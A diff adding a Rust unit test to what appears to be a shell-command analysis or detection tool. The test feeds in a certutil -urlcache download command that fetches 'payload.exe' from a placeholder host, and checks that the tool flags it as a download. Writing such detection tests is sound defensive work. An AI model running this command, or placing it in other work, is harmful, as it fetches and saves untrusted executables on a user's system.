@@ -7070,6 +7070,26 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_urlcache_accepts_schemeless_domain_path() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "certutil -urlcache -split -f cert-schemeless.example/payload.exe out.exe",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "http://cert-schemeless.example/payload.exe" && dst == "out.exe"
+            )
+        });
+        assert!(
+            has,
+            "no schemeless CertutilDownload trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn certutil_urlcache_accepts_single_quoted_url_and_output() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
